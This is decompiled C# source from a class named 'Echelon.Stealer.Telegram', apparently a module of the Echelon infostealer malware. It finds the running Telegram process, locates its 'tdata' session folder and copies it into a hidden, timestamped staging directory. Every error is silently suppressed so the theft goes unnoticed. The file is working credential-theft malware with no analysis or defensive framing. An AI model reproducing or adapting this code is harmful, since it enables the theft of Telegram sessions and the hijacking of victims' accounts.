﻿using System;
using System.Diagnostics;
using System.IO;

namespace Echelon.Stealer.Telegram
{
	// Token: 0x02000019 RID: 25
	public class Telegram
	{
		// Token: 0x06000064 RID: 100 RVA: 0x0001A4F8 File Offset: 0x000186F8
		public static void GetTelegram(string Echelon_Dir)
		{
			try
			{
				Process[] processesByName = Process.GetProcessesByName("Telegram");
				if (processesByName.Length >= 1)
				{
					string text = Path.GetDirectoryName(processesByName[0].MainModule.FileName) + "\\tdata";
					if (Directory.Exists(text))
					{
						string toDir = Echelon_Dir + "\\Telegram_" + ((int)(DateTime.UtcNow - new DateTime(1970, 1, 1)).TotalSeconds).ToString();
						Telegram.CopyAll(text, toDir);
						Telegram.count++;
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000065 RID: 101 RVA: 0x0001A5A0 File Offset: 0x000187A0
		private static void CopyAll(string fromDir, string toDir)
		{
			try
			{
				Directory.CreateDirectory(toDir).Attributes = (FileAttributes.Hidden | FileAttributes.Directory);
				string[] array = Directory.GetFiles(fromDir);
				for (int i = 0; i < array.Length; i++)
				{
					Telegram.CopyFile(array[i], toDir);
				}
				array = Directory.GetDirectories(fromDir);
				for (int i = 0; i < array.Length; i++)
				{
					Telegram.CopyDir(array[i], toDir);
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000066 RID: 102 RVA: 0x0001A614 File Offset: 0x00018814
		private static void CopyFile(string s1, string toDir)
		{
			try
			{
				string fileName = Path.GetFileName(s1);
				if (!Telegram.in_patch || fileName[0] == 'm' || fileName[1] == 'a' || fileName[2] == 'p')
				{
					string destFileName = toDir + "\\" + fileName;
					File.Copy(s1, destFileName);
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000067 RID: 103 RVA: 0x0001A67C File Offset: 0x0001887C
		private static void CopyDir(string s, string toDir)
		{
			try
			{
				Telegram.in_patch = true;
				Telegram.CopyAll(s, toDir + "\\" + Path.GetFileName(s));
				Telegram.in_patch = false;
			}
			catch
			{
			}
		}

		// Token: 0x04000053 RID: 83
		public static int count;

		// Token: 0x04000054 RID: 84
		private static bool in_patch;
	}
}
